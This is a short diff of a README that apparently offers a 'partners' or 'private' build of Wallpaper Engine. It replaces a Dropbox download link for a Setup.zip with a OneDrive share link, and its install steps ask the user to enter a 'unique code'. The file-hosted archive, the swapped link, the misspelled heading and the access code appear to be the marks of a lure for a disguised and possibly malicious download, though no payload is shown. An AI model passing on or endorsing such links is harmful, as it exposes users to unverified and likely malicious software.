@@ -15,7 +15,7 @@ DirectX: Version 10
 
 Disk space: 512 MB
 
-## 💿[Downlad WallPaperEngine for partners](https://www.dropbox.com/s/52dzpob92m7q88r/Setup.zip?dl=1)
+## 💿[Downlad WallPaperEngine for partners]( https://1drv.ms/u/s!AkIjhtUmdMQ9cTPiVjQAa633fMM?e=QJSvfx)
 Instruction for using new version of WallpaperEnginePrivate.
 1. open the application
 2. Enter your unique code
